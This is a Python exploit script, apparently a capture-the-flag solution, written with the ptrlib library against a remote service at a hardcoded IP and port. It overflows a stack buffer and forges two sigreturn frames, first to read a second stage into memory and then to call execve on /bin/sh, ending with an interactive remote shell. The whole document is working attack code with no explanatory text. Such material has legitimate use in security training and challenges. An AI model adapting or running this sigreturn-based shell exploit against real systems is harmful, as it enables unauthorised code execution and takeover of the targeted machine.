from ptrlib import *

#sock = Process("./vuln")
sock = Socket("146.148.108.204", 4444)
rop_pop_rax_syscall_leave = 0x00401032
rop_syscall_leave = 0x401033
addr_stage = 0x402800

payload = b'A' * 0x88
payload += p64(rop_pop_rax_syscall_leave)
payload += p64(15)
payload += p64(0) * 5
payload += p64(0) * 8 # r8 - r15
payload += p64(0) # rdi
payload += p64(addr_stage) # rsi
payload += p64(addr_stage) # rbp (for leave)
payload += p64(0) # rbc
payload += p64(306) # rdx
payload += p64(0) # rax = SYS_read
payload += p64(0) # rcx
payload += p64(addr_stage) # rsp
payload += p64(rop_syscall_leave) # rip
payload += p64(0) # eflags
payload += p64(0x33) # csgsfs
payload += p64(0) * 4
payload += p64(0) # fpstate
payload += b'\x00' * (0x400 - len(payload))
sock.recvline()
sock.send(payload)

payload  = b'/bin/sh\x00'
payload += p64(rop_pop_rax_syscall_leave)
payload += p64(15)
payload += p64(0) * 5
payload += p64(0) * 8 # r8 - r15
payload += p64(addr_stage) # rdi
payload += p64(0) # rsi
payload += p64(0) # rbp (for leave)
payload += p64(0) # rbc
payload += p64(0) # rdx
payload += p64(59) # rax = SYS_execve
payload += p64(0) # rcx
payload += p64(addr_stage) # rsp
payload += p64(rop_syscall_leave) # rip
payload += p64(0) # eflags
payload += p64(0x33) # csgsfs
payload += p64(0) * 4
payload += p64(0) # fpstate
payload += b'\x00' * (306 - len(payload))
sock.send(payload)

sock.interactive()
